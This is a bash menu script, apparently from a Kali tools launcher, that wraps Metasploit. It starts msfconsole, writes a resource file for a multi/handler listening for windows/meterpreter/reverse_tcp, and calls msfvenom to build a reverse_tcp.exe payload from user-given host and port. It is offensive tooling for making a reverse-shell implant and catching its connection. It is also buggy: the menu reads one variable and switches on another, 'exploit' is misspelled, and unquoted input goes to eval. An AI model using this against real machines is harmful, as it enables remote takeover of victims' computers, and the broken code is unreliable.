#!/bin/bash

source kp.conf

function menu_metasploit(){
	clear
	figlet Metasploit
    printf "${WHITE}+---+\n"
    printf "| 1 |%s\n" " Kali-tools-top10"
    printf "+---+\n"
    printf "${BLUE}%5s+---+\n"
    printf "%5s| 1 |%s\n" "" " metasploit-framework"
    printf "%5s+---+\n"
    printf "${WHITE}%10s+---+\n"
    printf "%10s| 1 |%s\n" "" " Normal Boot"
    printf "%10s+---+%s\n"
    printf "%10s+---+\n"
    printf "%10s| 2 |%s\n" "" " Create Multi handler" 
    printf "%10s+---+%s\n" "" " (windows/meterpreter/reverse_tcp)"
    printf "%10s+---+\n"
    printf "%10s| 3 |%s\n" "" " Create Payload"
    printf "%10s+---+%s${NC}\n"
	read -n 1 -s NUM
    echo ""
    case $ANS in
    1)
        cmd_metasploit1
        ;;
    2)
        cmd_metasploit2
        ;;
	3)
		cmd_metasploit3
		;;
    *)
        ;;
    esac
}

function cmd_metasploit1(){
	clear
	figlet Metasploit
    printf "${BLUE}usage${NC} :Usage: msfconsole ${WHITE}[options]${NC}"
    printf "${BLUE}Options${NC}:\n"
    echo "  -q, --quiet                      Do not print the banner on startup"
    echo "  -r, --resource FILE              Execute the specified resource file (- for stdin)"
    echo "  -h, --help                       Show this message    "
    cmd="msfconsole"
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[1]metasploit-framework${NC} > ${BLUE}[1]Normal Boot${NC}\n"
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}

function cmd_metasploit2(){
	clear
	figlet Metasploit
    echo "Create handler..."
    read -p "Local host <IP Address>: " LHOST
    read -p "Local Port: " LPORT
    cat <<EOF >> resouce.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
exsploit
EOF
    echo ""
    echo "PAYLOAD: windows/meterpreter/reverse_tcp"
    echo "LHOST  : $LHOST"
    echo "LPORT  : $LPORT"
    cmd="msfconsole"
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[1]metasploit-framework${NC} > ${BLUE}[2]Create Multi Handler${NC}\n"
    cmd+=" -r resouce.rc"
    echo "└─Command? > $cmd"
    read -e -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
    rm resouce.rc
}

function cmd_metasploit3(){
	clear
	figlet Metasploit
    echo "Create Payload..."
    read -p "Local host <IP Address>: " LHOST
    read -p "Local Port: " LPORT
    echo ""
    echo "PAYLOAD  : windows/meterpreter/reverse_tcp"
    echo "LHOST    : $LHOST"
    echo "LPORT    : $LPORT"
    echo "Filetype : exe"
    cmd="msfvenom"
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[1]metasploit-framework${NC} > ${BLUE}[3]Create Payload${NC}\n"
    cmd="$cmd -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -f exe > `pwd`/reverse_tcp.exe"
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}
